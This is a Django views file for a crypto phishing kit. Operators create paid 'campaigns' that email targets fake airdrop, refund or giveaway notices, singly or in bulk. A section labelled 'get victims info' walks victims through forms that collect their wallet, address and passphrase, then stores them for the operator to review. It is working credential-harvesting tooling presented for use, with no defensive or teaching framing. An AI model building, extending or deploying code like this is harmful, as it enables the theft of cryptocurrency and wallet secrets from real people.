#core.views
from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from .models import Campaign, VictimInfo
from django.shortcuts import render, redirect
from .forms import WalletForm, AddressForm, PassphraseForm, VictimInfoForm, CampaignForm, MultiCampaignForm
from django.core.mail import send_mail
from django.template.loader import render_to_string



# Mapping of email templates
TEMPLATE_MAPPING = {
    'AIRDROP': 'templates/emails/airdrop_notification.html',
    'REFUND': 'templates/emails/refund_notification.html',
    'GIVEAWAY': 'templates/emails/giveaway_notification.html',
}



def index(request):
    return render(request, 'core/index.html')

@login_required
def create_campaign(request):
    if request.method == 'POST':
        form = CampaignForm(request.POST)
        if form.is_valid():
            campaign = form.save(commit=False)
            campaign.user = request.user

            # Deduct XP cost
            if request.user.userprofile.xp_balance >= campaign.xp_cost:
                request.user.userprofile.xp_balance -= campaign.xp_cost
                request.user.userprofile.save()
                campaign.save()

                # Prepare context for email
                context = {
                    'recipient_email': campaign.recipient_email,
                    'cryptocurrency': campaign.cryptocurrency,
                    'quantity': campaign.quantity,
                    'min_balance': campaign.min_balance,
                }

                # Get the template path using the mapping
                template_path = TEMPLATE_MAPPING.get(campaign.email_template)
                if template_path:
                    send_campaign_email(campaign.recipient_email, template_path, context)
                    
                messages.success(request, 'Campaign created and email sent successfully!')
                return redirect('core:campaign_list')
            else:
                messages.error(request, 'Insufficient XP balance to create this campaign.')
    else:
        form = CampaignForm()
    return render(request, 'core/create_campaign.html', {'form': form})




@login_required
def create_multi_campaign(request):
    if request.method == 'POST':
        form = MultiCampaignForm(request.POST)
        if form.is_valid():
            recipient_emails = form.cleaned_data['recipient_emails']
            campaign_template = form.cleaned_data['email_template']

            for email in recipient_emails:
                campaign = form.save(commit=False)
                campaign.user = request.user
                campaign.recipient_email = email
                # Deduct XP cost
                if request.user.userprofile.xp_balance >= campaign.xp_cost:
                    request.user.userprofile.xp_balance -= campaign.xp_cost
                    request.user.userprofile.save()
                    campaign.save()
                    
                    # Send the email based on template
                    send_campaign_email(email, campaign_template, campaign)

                else:
                    messages.error(request, f"Insufficient XP for {email}. Campaign could not be created.")
                    continue

            messages.success(request, 'Campaigns created and emails sent successfully!')
            return redirect('core:campaign_list')
    else:
        form = MultiCampaignForm()

    return render(request, 'core/create_multi_campaign.html', {'form': form})

@login_required
def campaign_list(request):
    campaigns = Campaign.objects.filter(user=request.user)
    return render(request, 'core/campaign_list.html', {'campaigns': campaigns})


################################## get victims info ##################################

def wallet_info(request):
    if request.method == 'POST':
        form = WalletForm(request.POST)
        if form.is_valid():
            victim_info = form.save(commit=False)
            request.session['victim_wallet'] = victim_info.wallet  # Store wallet info in session
            return redirect('core:address_info')  # redirect to the next step
    else:
        form = WalletForm()

    return render(request, 'core/wallet_info.html', {'form': form})

def address_info(request):
    if request.method == 'POST':
        form = AddressForm(request.POST)
        if form.is_valid():
            request.session['victim_address'] = form.cleaned_data['address']  # Store address info in session
            return redirect('core:passphrase_info')
    else:
        form = AddressForm()

    return render(request, 'core/address_info.html', {'form': form})

def passphrase_info(request):
    if request.method == 'POST':
        form = PassphraseForm(request.POST)
        if form.is_valid():
            # Create VictimInfo object and save to the database
            victim_info = VictimInfo(
                wallet=request.session.get('victim_wallet'),
                recipient_email=form.cleaned_data['recipient_email'],  # Assuming email is provided in this form
                passphrase=form.cleaned_data['passphrase'],
                address=request.session.get('victim_address'),
                user=None  # No user associated with victim info
            )
            victim_info.save()
            # Clear session data after saving
            del request.session['victim_wallet']
            del request.session['victim_address']
            return redirect('core:victim_info')  # Redirect to view all submitted info
    else:
        form = PassphraseForm()

    return render(request, 'core/passphrase_info.html', {'form': form})

#def victim_info(request):
#    victim_info = VictimInfo.objects.all()  # Retrieve all victim info
#    return render(request, 'core/victim_info.html', {'victim_info': victim_info})


@login_required
def victim_info_list(request):
    victim_infos = VictimInfo.objects.filter(user=request.user).order_by('-created_at')
    return render(request, 'core/victim_info_list.html', {'victim_infos': victim_infos})



################################ EMAIL SENDING ###################################

def send_campaign_email(recipient_email, template, context):
    subject = 'Exciting News from Our Campaign!'
    message = render_to_string(template, context)
    send_mail(subject, message, 'from@example.com', [recipient_email], fail_silently=False)
